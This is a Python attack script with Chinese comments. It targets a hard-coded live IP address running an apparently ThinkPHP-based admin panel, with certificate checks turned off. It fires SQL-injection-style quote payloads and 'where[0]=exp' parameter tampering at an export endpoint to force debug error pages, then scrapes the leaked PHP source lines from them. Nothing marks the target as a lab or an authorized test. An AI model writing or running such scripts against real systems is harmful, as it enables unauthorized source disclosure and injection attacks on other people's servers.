#!/usr/bin/env python3
"""tp_src_export.py - 让错误发生在Export.php内部以泄露更多源码
思路: PHP notice/warning 级别的错误也会触发debug页, 且显示位置在业务文件
"""
import urllib.request, ssl, re

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'https://139.196.199.221'

def get(url):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=8, context=ctx)
        return r.status, r.read(300000).decode('utf-8', 'ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.read(300000).decode('utf-8', 'ignore')
    except Exception:
        return 0, ''

def leak_lines(b):
    lines = {}
    for m in re.finditer(r'<li class="line-(\d+)"><code>(.*?)</code></li>', b, re.S):
        lines[int(m.group(1))] = re.sub(r'<[^>]+>', '', m.group(2))
    return lines

def file_of(b):
    """找错误发生的文件"""
    for m in re.finditer(r'<a class="toggle" title="([^"]+)"', b):
        f = m.group(1)
        if 'Export.php' in f or 'controller' in f:
            return f
    return ''

all_lines = {}
# 触发在Export.php内部执行到更深行的错误
triggers = [
    # 让$data['num']保持未定义但后面执行 - 传大数/特殊值
    '/admin/export/goodslist.html?num=99999999999999999999999',
    '/admin/export/goodslist.html?num=5&page=1&order=g.id%27',
    '/admin/export/goodslist.html?num=5&page=1&where[0]=exp',
    '/admin/export/goodslist.html?num=5&page=1&field=id%27,1',
    '/admin/export/goodslist.html?num=5&page=1&g.id=1%27',
    # 尝试让SQL执行(可能报SQL错误显示更多上下文)
    '/admin/export/goodslist.html?num=5&page=1&sort=create_time%20desc',
]
for t in triggers:
    st, b = get(BASE + t)
    l = leak_lines(b)
    f = file_of(b)
    new = {k: v for k, v in l.items() if k not in all_lines}
    if new:
        print('%s: +%d new (file=%s)' % (t.split('?')[1], len(new), f.split('/')[-1] if f else '?'), flush=True)
        all_lines.update(new)
    # 打印错误标题
    m = re.search(r'<h1>([^<]{0,80})</h1>', b)
    if m and 'variable type' not in m.group(1):
        print('  err: %s' % m.group(1), flush=True)

print()
print('=== 汇总 (file-based) ===')
for ln in sorted(all_lines):
    print('  %4d: %s' % (ln, all_lines[ln][:140]), flush=True)
print('=== DONE ===')
